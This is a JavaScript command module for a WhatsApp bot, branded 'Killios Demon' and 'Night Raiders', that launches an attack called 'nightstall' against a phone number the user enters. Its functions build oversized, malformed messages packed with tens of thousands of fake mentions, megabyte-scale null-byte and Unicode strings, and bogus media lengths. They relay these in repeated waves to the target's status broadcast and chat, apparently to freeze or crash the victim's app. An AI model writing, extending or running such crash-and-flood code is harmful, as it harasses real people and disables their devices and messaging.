 const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const crypto = require('crypto');
const attackManager = require('../lib/attackManager');
const helpers = require('../lib/helpers');

module.exports = {
  name: 'nightstall',
  aliases: ['ns', 'stall', 'freeze', 'frostbite', 'icelock', 'freezer', 'coldsnap'],
  description: '🧊 ᴋɪʟʟɪᴏs ᴅᴇᴍᴏɴ - sᴛᴀᴛᴜs ғʀᴇᴇᴢᴇ',
  ownerOnly: true,
  groupOnly: false,

  async execute(sock, msg, args, { sender, chatId }) {
    const target = args[0];
    const ownerNumbers = helpers.getOwnerNumbers();
    const ownerJid = ownerNumbers[0] ? `${ownerNumbers[0]}@s.whatsapp.net` : sender;
    
    if (!target) {
      return await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ 🧊 ɴɪɢʜᴛsᴛᴀʟʟ - ᴋɪʟʟɪᴏs ᴅᴇᴍᴏɴ 🧊
╚═══════════════════════════════════════════╝

⛔ ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ

📱 ᴜsᴀɢᴇ: .ɴɪɢʜᴛsᴛᴀʟʟ <ɴᴜᴍʙᴇʀ>
🛑 sᴛᴏᴘ: .ɴɪɢʜᴛsᴛᴀʟʟ sᴛᴏᴘ

☠️ ᴛʜɪs ᴅᴇᴍᴏɴ ғʀᴇᴇᴢᴇs ᴛʜᴇ ᴛᴀʀɢᴇᴛ's 
sᴛᴀᴛᴜs, ʟᴇᴀᴠɪɴɢ ᴛʜᴇᴍ ʜᴇʟᴘʟᴇss.

👿 "ғʀᴏᴢᴇɴ ɪɴ ᴅᴀʀᴋɴᴇss" ☠️
╰────────────────────────────────────────╯` 
      });
    }

    if (target.toLowerCase() === 'stop') {
      const stopped = attackManager.stopAllAttacksForSender(sender);
      return await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ 🛑 ᴀᴛᴛᴀᴄᴋ ʜᴀʟᴛᴇᴅ 🛑
╚═══════════════════════════════════════════╝

${stopped > 0 ? `✅ sᴛᴏᴘᴘᴇᴅ ${stopped} ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ(s)` : '⚠️ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋs ғᴏᴜɴᴅ'}

👿 "ᴛʜᴇ ғʀᴇᴇᴢᴇ ᴛʜᴀᴡs" ☠️
╰────────────────────────────────────────╯` 
      });
    }

    const targetJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
    const attackId = attackManager.generateAttackId(sender, targetJid, 'nightstall');

    if (attackManager.isAttackActive(attackId)) {
      return await sock.sendMessage(chatId, { 
        text: `⚠️ ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ!\n\n🛑 ᴜsᴇ .ɴɪɢʜᴛsᴛᴀʟʟ sᴛᴏᴘ ᴛᴏ ʜᴀʟᴛ` 
      });
    }

    attackManager.startAttack(attackId, {
      sender,
      target: targetJid,
      commandName: 'nightstall',
      chatId
    });

    await sock.sendMessage(chatId, { 
      text: `╔═══════════════════════════════════════════╗
║ 🧊 ɴɪɢʜᴛsᴛᴀʟʟ ᴅᴇᴍᴏɴ ᴜɴʟᴇᴀsʜᴇᴅ 🧊
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
⚡ sᴛᴀᴛᴜs: ғʀᴇᴇᴢɪɴɢ sʏsᴛᴇᴍ...
🔄 ᴄʏᴄʟᴇs: 0/100

👿 "ғʀᴇᴇᴢᴇ ᴀɴᴅ ᴅᴇsᴛʀᴏʏ" ☠️
╰────────────────────────────────────────╯` 
    });

    const blankDelayMp3 = async () => {
      const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
      ];

      const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs" + "ោ៝".repeat(10000),
        title: "ᴅᴇᴍᴏɴɪᴄ ғʀᴇᴇᴢᴇ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://t.me/NightRaiders",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
      };

      const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "👿 ɴɪɢʜᴛsᴛᴀʟʟ",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
          isSampled: true,
          mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: "ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs【☠︎】"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
          {
            embeddedContent: { embeddedMusic },
            embeddedAction: true
          }
        ]
      };

      const audioMessagePayload = {
        viewOnceMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc",
              mimetype: "audio/mpeg",
              fileSha256: Buffer.from([
                226, 213, 217, 102, 205, 126, 232, 145, 0, 70, 137, 73, 190, 145, 0,
                44, 165, 102, 153, 233, 111, 114, 69, 10, 55, 61, 186, 131, 245,
                153, 93, 211
              ]),
              fileLength: 432722,
              seconds: 20,
              ptt: false,
              mediaKey: Buffer.from([
                182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98,
                117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212,
                145
              ]),
              fileEncSha256: Buffer.from([
                29, 27, 247, 158, 114, 50, 140, 73, 40, 108, 77, 206, 2, 12, 84,
                131, 54, 42, 63, 11, 46, 208, 136, 131, 224, 87, 18, 220, 254, 211,
                83, 153
              ]),
              directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc",
              mediaKeyTimestamp: 1746275400,
              contextInfo: {
                mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                isSampled: true,
                participant: targetJid,
                remoteJid: "status@broadcast",
                forwardingScore: 9741,
                isForwarded: true
              }
            }
          }
        }
      };

      const msgAudio = generateWAMessageFromContent(targetJid, audioMessagePayload, {});
      await sock.relayMessage("status@broadcast", msgAudio.message, {
        messageId: msgAudio.key.id,
        statusJidList: [targetJid]
      });

      const msgVideo = generateWAMessageFromContent(targetJid, {
        viewOnceMessage: { message: { videoMessage } }
      }, {});
      await sock.relayMessage("status@broadcast", msgVideo.message, {
        messageId: msgVideo.key.id,
        statusJidList: [targetJid]
      });

      await sock.relayMessage(targetJid, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgVideo.key,
              type: 25
            }
          }
        }
      }, {});
    };

    const generateLargeString = (sizeInBytes) => {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < sizeInBytes; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    };

    const bulldozer5GB = async () => {
      const SID = "5e03e0&mms3";
      const key = "10000000_2012297619515179_5714769099548640934_n.enc";
      const type = "image/webp";
      const extraPayload = generateLargeString(8.5 * 1024 * 1024);

      const message = {
        viewOnceMessage: {
          message: {
            stickerMessage: {
              url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
              fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
              fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
              mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
              mimetype: type,
              directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
              fileLength: { low: 999999, high: 0, unsigned: true },
              mediaKeyTimestamp: { low: Date.now() % 2147483647, high: 0, unsigned: false },
              firstFrameLength: 19904,
              firstFrameSidecar: "KN4kQ5pyABRAgA==",
              isAnimated: true,
              contextInfo: {
                participant: targetJid,
                mentionedJid: ["0@s.whatsapp.net"],
                groupMentions: [],
                entryPointConversionSource: "non_contact",
                entryPointConversionApp: "whatsapp",
                entryPointConversionDelaySeconds: 999999,
              },
              stickerSentTs: { low: -10000000, high: 999, unsigned: false },
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              extraPayload,
            },
          },
        },
      };

      const msg = generateWAMessageFromContent(targetJid, message, {});

      for (let i = 0; i < 10; i++) {
        await sock.relayMessage("status@broadcast", msg.message, {
          messageId: msg.key.id,
          statusJidList: [targetJid],
        });
      }
    };

    const protocolbug6 = async () => {
      const quotedMessage = {
        extendedTextMessage: {
          text: "᭯".repeat(12000),
          matchedText: "https://" + "ꦾ".repeat(500) + ".com",
          canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
          description: "\u0000".repeat(500),
          title: "👿 ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs【☠︎】",
          previewType: "NONE",
          jpegThumbnail: Buffer.alloc(10000), 
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
              showAdAttribution: true,
              title: "ɴɪɢʜᴛʀᴇᴀᴘ",
              body: "\u0000".repeat(10000),
              thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
              mediaType: 1,
              renderLargerThumbnail: true,
              sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
          }
        },
        paymentInviteMessage: {
          currencyCodeIso4217: "USD",
          amount1000: "999999999",
          expiryTimestamp: "9999999999",
          inviteMessage: "ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs" + "💥".repeat(1770),
          serviceType: 1
        }
      };

      const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
      ];

      const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs" + "ោ៝".repeat(10000),
        title: "ᴅᴇᴍᴏɴɪᴄ ʀᴇᴀᴘᴇʀ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://t.me/NightRaiders",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
      };

      const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            title: "👿 ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs【☠︎】",
            body: `${"\u0000".repeat(9117)}`,
            mediaType: 1,
            renderLargerThumbnail: true,
            thumbnailUrl: null,
            sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
          },
          businessMessageForwardInfo: { businessOwnerJid: targetJid },
          quotedMessage: quotedMessage,
          isSampled: true,
          mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [{ embeddedContent: { embeddedMusic }, embeddedAction: true }]
      };

      const msg = generateWAMessageFromContent(targetJid, {
        viewOnceMessage: { message: { videoMessage } }
      }, {});

      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [targetJid]
      });
    };

    const kill = async () => {
      for (let wave = 0; wave < 30; wave++) {
        try {
          const p1 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/999999999_000000000000000000000000000000_n.enc",
                  mimetype: "image/jpeg",
                  fileLength: "999999999999",
                  jpegThumbnail: Buffer.alloc(2 * 1024 * 1024, 0),
                  contextInfo: {
                    mentionedJid: Array.from({length: 180000}, () => `${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`),
                    forwardingScore: 999999999,
                    isForwarded: true,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast"
                  }
                }
              }
            }
          }, {});

          const p2 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                newsletterAdminInviteMessage: {
                  newsletterJid: "0".repeat(99999) + "@newsletter",
                  newsletterName: "ꦾ࣯".repeat(150000),
                  caption: ""
                }
              }
            }
          }, {});

          const p3 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: { text: "" },
                  nativeFlowMessage: {
                    name: "DEATH",
                    paramsJson: "\u0000".repeat(1500000) + "ꦾ".repeat(200000)
                  },
                  messageContextInfo: { messageSecret: crypto.randomBytes(64) }
                }
              }
            }
          }, {});

          const p4 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                extendedTextMessage: {
                  text: "\u200E".repeat(200000) + "\u202E" + "࣯ꦾ".repeat(200000),
                  contextInfo: {
                    quotedMessage: { callLogMessage: { callType: "VIDEO", durationSecs: 0 } },
                    forwardingScore: 999999999,
                    isForwarded: true
                  }
                }
              }
            }
          }, {});

          const p5 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                videoMessage: {
                  fileLength: "999999999999999",
                  seconds: 999999999,
                  mediaKey: crypto.randomBytes(32).toString('base64'),
                  streamingSidecar: Buffer.alloc(3 * 1024 * 1024, 0),
                  contextInfo: {
                    externalAdReply: {
                      title: "",
                      body: "ꦾ".repeat(200000),
                      thumbnail: Buffer.alloc(2 * 1024 * 1024, 0)
                    },
                    mentionedJid: Array(200000).fill("0@s.whatsapp.net")
                  }
                }
              }
            }
          }, {});

          for (let i = 0; i < 20; i++) {
            const payloads = [p1, p2, p3, p4, p5];
            for (const payload of payloads) {
              try {
                await sock.relayMessage(targetJid, payload.message, { messageId: payload.key.id });
              } catch (_) {}
            }
          }
        } catch (err) {
          console.error('Nightstall kill wave error:', err.message);
        }
      }
    };

    const attackFunction = async () => {
      await blankDelayMp3();
      await bulldozer5GB();
      await protocolbug6();
      await kill();
    };

    const onProgress = async (cycle, max) => {
      try {
        await sock.sendMessage(ownerJid, { 
          text: `🧊 ɴɪɢʜᴛsᴛᴀʟʟ ᴘʀᴏɢʀᴇss\n🎯 ${target}\n📊 ${cycle}/${max} sᴇɴᴛ` 
        });
      } catch (e) {}
    };

    const onComplete = async (cycle, status) => {
      const statusText = status === 'stopped' ? '🛑 sᴛᴏᴘᴘᴇᴅ' : '✅ ᴄᴏᴍᴘʟᴇᴛᴇᴅ';
      await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ 🧊 ɴɪɢʜᴛsᴛᴀʟʟ ${statusText} 🧊
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
📊 ᴄʏᴄʟᴇs ᴄᴏᴍᴘʟᴇᴛᴇᴅ: ${cycle}/100

👿 "ᴛʜᴇ ғʀᴇᴇᴢᴇ ᴄᴏᴍᴘʟᴇᴛᴇ" ☠️
╰────────────────────────────────────────╯` 
      });
    };

    attackManager.runContinuousAttack(sock, attackId, attackFunction, onProgress, onComplete);
  }
}; 
